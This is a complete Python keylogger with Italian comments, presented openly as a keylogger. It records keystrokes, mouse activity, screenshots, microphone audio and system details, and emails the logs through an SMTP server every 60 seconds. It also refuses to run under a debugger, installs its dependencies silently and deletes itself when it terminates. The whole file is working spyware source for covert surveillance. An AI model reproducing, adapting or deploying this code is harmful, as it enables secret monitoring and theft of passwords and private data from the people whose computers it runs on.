try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener, Key
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
    import configparser
    from cryptography.fernet import Fernet
    import sys
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "cryptography"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    # --- Funzione per rilevare se il codice e' in Debug ---
    def is_debugging():
       # Controlla se il processo corrente Ã¨ in debug
       return hasattr(sys, 'gettrace') and sys.gettrace() is not None
    if is_debugging():
       print("Il Keylogger non puo' essere eseguito in modalita' debug.")
       sys.exit()

    # --- Configurazione del Logging ---
    LOG_FILE = "keylogger.log"
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s')
    logging.info("Keylogger avviato.")
    # --- Fine Configurazione Logging ---

    # --- Funzioni per la Crittografia ---
    def encrypt_credentials(email, password, key):
        fernet = Fernet(key)
        encrypted_email = fernet.encrypt(email.encode()).decode()
        encrypted_password = fernet.encrypt(password.encode()).decode()
        return encrypted_email, encrypted_password

    def save_config(email, password):
        config = configparser.ConfigParser()
        config['Credentials'] = {'Email': email, 'Password': password}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
    # --- Fine Funzioni Crittografia ---

    # --- Configurazione delle Credenziali (INSERITE DIRETTAMENTE) ---
    EMAIL_ADDRESS = "YOUR_USERNAME"  # <--- INSERISCI QUI LA TUA EMAIL
    EMAIL_PASSWORD = "YOUR_PASSWORD"  # <--- INSERISCI QUI LA TUA PASSWORD
    SEND_REPORT_EVERY = 60  # in secondi
    # --- Fine Configurazione Credenziali ---

    # Cripta e salva le credenziali nel file di configurazione
    key = Fernet.generate_key()  # Genera una nuova chiave segreta
    encrypted_email, encrypted_password = encrypt_credentials(EMAIL_ADDRESS, EMAIL_PASSWORD, key)
    save_config(encrypted_email, encrypted_password)

    # Leggi le credenziali criptate dal file di configurazione
    config = configparser.ConfigParser()
    config.read('config.ini')
    encrypted_email = config.get('Credentials', 'Email')
    encrypted_password = config.get('Credentials', 'Password')

    # Decifra le credenziali
    fernet = Fernet(key)
    EMAIL_ADDRESS = fernet.decrypt(encrypted_email.encode()).decode()
    EMAIL_PASSWORD = fernet.decrypt(encrypted_password.encode()).decode()

    # --- Inizio Definizione Class Keylogger ---
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            # Inizializzazione delle variabili della classe
            self.interval = time_interval
            self.log = "KeyLogger avviato...\n"
            self.email = email
            self.password = password
            self.key_mapping = { # Mappa i codici dei tasti a stringhe leggibili
                Key.space: " [SPACE] ",
                Key.esc: " [ESC] ",
                Key.enter: " [ENTER] ",
                Key.tab: " [TAB] ",
                Key.shift: " [SHIFT] ",
                Key.ctrl_l: " [CTRL_L] ",
                Key.ctrl_r: " [CTRL_R] ",
                Key.alt_l: " [ALT_L] ",
                Key.alt_r: " [ALT_R] ",
                 Key.backspace: " [BACKSPACE] ",
                Key.caps_lock: " [CAPS_LOCK] ",
            }

        def appendlog(self, string):
            # Funzione per aggiungere una stringa al log
            self.log += string

        def on_move(self, x, y):
            # Registra il movimento del mouse
            logging.debug("Mouse moved to {} {}".format(x, y))
            current_move = "Mouse spostato a {} {}\n".format(x, y)
            self.appendlog(current_move)

        def on_click(self, x, y):
            # Registra il click del mouse
            logging.debug("Mouse cliccato a {} {}".format(x, y))
            current_click = "Mouse cliccato a {} {}\n".format(x, y)
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            # Registra lo scroll del mouse
            logging.debug("Mouse scroll a {} {}".format(x, y))
            current_scroll = "Mouse scorrizzato a {} {}\n".format(x, y)
            self.appendlog(current_scroll)

        def save_data(self, key):
            # Registra i tasti premuti
            logging.debug("Tasto premuto: {}".format(key))
            try:
                current_key = str(key.char)
                if current_key == "'":
                   current_key = " \' "
                self.appendlog(current_key + " ") # aggiunge spazio dopo il carattere
            except AttributeError:
                current_key = self.key_mapping.get(key, " " + str(key) + " ")
                self.appendlog(current_key)

        def send_mail(self, email, password, message):
            # Invia il log via email
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"
            m = f"""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}

            Keylogger by MC"""
            m += message
            try:
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                   server.login(email, password)
                   server.sendmail(sender, receiver, message)
                   logging.info("Email sent successfully.")
            except Exception as e:
                logging.error(f"Failed to send email: {e}")
        def report(self):
            # Invia il log e reimposta la variabile self.log
            logging.info("Starting report.")
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = "-------------------------------\n" # Linea di separazione tra i log
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            # Raccoglie informazioni di sistema
            logging.debug("Collecting system information.")
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            sys_info = f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
            self.appendlog(sys_info)

        def microphone(self):
            # Registra l'audio dal microfono
            logging.debug("Starting microphone recording.")
            fs = 44100
            seconds = SEND_REPORT_EVERY
            try:
               obj = wave.open('sound.wav', 'w')
               obj.setnchannels(1)
               obj.setsampwidth(2)
               obj.setframerate(fs)
               myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
               obj.writeframesraw(myrecording)
               sd.wait()
               self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
               os.remove('sound.wav')
               logging.info("Microphone recording and sending completed.")
            except Exception as e:
                logging.error(f"Failed to record or send microphone data: {e}")
        def screenshot(self):
            # Cattura uno screenshot
            logging.debug("Taking a screenshot.")
            try:
                img = pyscreenshot.grab()
                self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
                logging.info("Screenshot captured and sent.")
            except Exception as e:
                logging.error(f"Failed to capture or send screenshot: {e}")

        def run(self):
            # Avvia il keylogger
            logging.info("Keylogger is running.")
            self.system_information()
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            # Logica per la terminazione del keylogger
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File chiuso.')
                    os.system("DEL " + os.path.basename(__file__))
                    logging.info("Keylogger terminated (Windows).")
                except OSError:
                    print('File chiuso.')
                    logging.error("Failed to terminate keylogger (Windows).")
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " + os.path.basename(__file__))
                    print('File chiuso.')
                    os.system("rm -rf" + os.path.basename(__file__))
                    logging.info("Keylogger terminated (Linux).")
                except OSError:
                    print('File chiuso.')
                    logging.error("Failed to terminate keylogger (Linux).")
    # --- Fine Definizione Class Keylogger ---

    # --- Avvio Keylogger ---
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
    # --- Fine Avvio Keylogger ---